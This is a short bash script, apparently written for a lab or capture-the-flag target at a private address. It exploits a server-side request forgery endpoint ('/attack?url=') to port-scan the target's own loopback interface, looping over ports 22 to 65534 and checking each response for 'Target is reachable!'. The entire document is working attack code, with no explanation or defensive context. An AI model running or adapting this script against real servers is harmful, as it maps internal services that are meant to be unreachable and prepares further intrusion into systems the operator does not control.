#!/bin/bash

varibl=22;
while [ "$varibl" -ne 65535 ] 
do
	echo $varibl
	curl -s "http://10.10.86.232:8000/attack?url=http://user@127.0.0.1:$varibl" | grep 'Target is reachable!';
(("varibl++"))
done